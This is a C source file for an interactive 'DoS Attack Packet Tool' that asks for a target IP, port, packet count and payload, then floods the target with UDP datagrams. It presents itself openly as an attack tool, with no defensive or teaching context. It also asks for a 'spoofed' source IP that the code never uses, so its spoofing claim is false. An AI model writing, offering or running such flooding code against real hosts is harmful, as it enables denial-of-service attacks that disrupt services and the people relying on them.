#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

// Function prototypes
void sendUDPFlood(char *target, int port, int count, char *payload, char *source_ip);
void displayMenu();
void getUDPPacketData(char *target, int *port, int *packetCount, char *payload, char *source_ip);

int main() {
    int choice;
    while (1) {
        displayMenu();
        printf("Select an option: ");
        scanf("%d", &choice);
        getchar(); // Clear newline from input buffer

        switch (choice) {
            case 1: {
                char target[50];
                int port, packetCount;
                char payload[1024], source_ip[50];

                getUDPPacketData(target, &port, &packetCount, payload, source_ip);
                sendUDPFlood(target, port, packetCount, payload, source_ip);
            }
            break;
            case 0:
                printf("Exiting the program.\n");
                return 0;
            default:
                printf("Invalid option! Try again.\n");
        }
    }

    return 0;
}

void displayMenu() {
    printf("=== DoS Attack Packet Tool ===\n");
    printf("1. UDP Flood\n");
    printf("0. Exit\n");
}

void getUDPPacketData(char *target, int *port, int *packetCount, char *payload, char *source_ip) {
    printf("Enter the target IP address: ");
    fgets(target, 50, stdin);
    target[strcspn(target, "\n")] = '\0';  // Remove newline character

    printf("Enter the source IP address (spoofed): ");
    fgets(source_ip, 50, stdin);
    source_ip[strcspn(source_ip, "\n")] = '\0';

    printf("Enter the target port: ");
    scanf("%d", port);
    getchar();

    printf("Enter the number of packets to send: ");
    scanf("%d", packetCount);
    getchar();

    printf("Enter the payload (Example: 'DATA_FLOOD'): ");
    fgets(payload, 1024, stdin);
    payload[strcspn(payload, "\n")] = '\0';
}

void sendUDPFlood(char *target, int port, int count, char *payload, char *source_ip) {
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[2048];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    // Fill in target address details
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target);

    printf("Sending %d UDP flood packets to %s:%d with payload: %s\n", count, target, port, payload);

    // Create custom UDP packets with the user-defined payload
    for (int i = 0; i < count; i++) {
        strcpy(packet, payload); // Set the payload in the packet

        if (sendto(sockfd, packet, strlen(packet), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet sending failed");
        } else {
            printf("Packet %d sent to %s:%d\n", i + 1, target, port);
        }
    }

    close(sockfd);
}
